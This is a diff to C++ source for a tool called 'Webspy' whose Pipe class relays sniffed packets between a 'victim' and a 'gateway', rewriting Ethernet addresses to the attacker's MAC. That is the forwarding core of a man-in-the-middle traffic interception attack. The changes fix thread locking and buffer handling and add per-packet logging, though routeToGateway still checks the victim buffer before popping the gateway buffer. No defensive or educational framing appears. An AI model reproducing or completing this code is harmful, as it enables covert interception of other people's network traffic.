@@ -11,14 +11,17 @@ std::queue<Packet>	Pipe::gatewayBuffer;
 std::queue<Packet>	Pipe::victimBuffer;
 pthread_mutex_t 	Pipe::victimMutex;
 pthread_mutex_t 	Pipe::gatewayMutex;
-Crafter				Pipe::victimCrafter(Globals::iface);
-Crafter				Pipe::gatewayCrafter(Globals::iface);
+Crafter				Pipe::victimCrafter;
+Crafter				Pipe::gatewayCrafter;
 
 Pipe::Pipe(){}
 
 Pipe::~Pipe(){}
 
 void Pipe::init(){
+	victimCrafter.init(Globals::iface);
+	gatewayCrafter.init(Globals::iface);
+
 	if(pthread_create(&snifferThread, nullptr, connect, nullptr) < 0){
 		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
 		exit(EXIT_FAILURE);
@@ -41,6 +44,7 @@ void Pipe::init(){
 		printf("Webspy::Pipe::init > [ERRO] can't init relay thread\n");
 		exit(EXIT_FAILURE);
 	}
+
 }
 
 void* Pipe::connect(void* args){
@@ -75,7 +79,7 @@ void Pipe::relay(u_char* args, const struct pcap_pkthdr* header, const unsigned 
 void* Pipe::routeToVictim(void* args){
 	while(1 == 1){
 		if(!victimBuffer.empty()){
-			pthread_mutex_trylock(&victimMutex);
+			pthread_mutex_lock(&victimMutex);
 			Packet packet = victimBuffer.front();
 			victimBuffer.pop();
 			pthread_mutex_unlock(&victimMutex);
@@ -84,6 +88,7 @@ void* Pipe::routeToVictim(void* args){
 			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
 			memcpy(ether->thaddr, Globals::victim.mac->ether_addr_octet, 6);
 
+			printf("Packet: %d bytes    attacker  ->  victim\n", packet.len);
 			victimCrafter.sendRaw(packet);
 		}
 	}
@@ -92,15 +97,16 @@ void* Pipe::routeToVictim(void* args){
 void* Pipe::routeToGateway(void* args){
 	while(1 == 1){
 		if(!victimBuffer.empty()){
-			pthread_mutex_trylock(&gatewayMutex);
-			Packet packet = victimBuffer.front();
-			victimBuffer.pop();
+			pthread_mutex_lock(&gatewayMutex);
+			Packet packet = gatewayBuffer.front();
+			gatewayBuffer.pop();
 			pthread_mutex_unlock(&gatewayMutex);
 
 			Ethernet* ether = (Ethernet*) packet.data;
 			memcpy(ether->shaddr, Globals::attacker.mac->ether_addr_octet, 6);
 			memcpy(ether->thaddr, Globals::gateway.mac->ether_addr_octet, 6);
 
+			printf("Packet: %d bytes    attacker  ->  gateway\n", packet.len);
 			gatewayCrafter.sendRaw(packet);
 		}
 	}
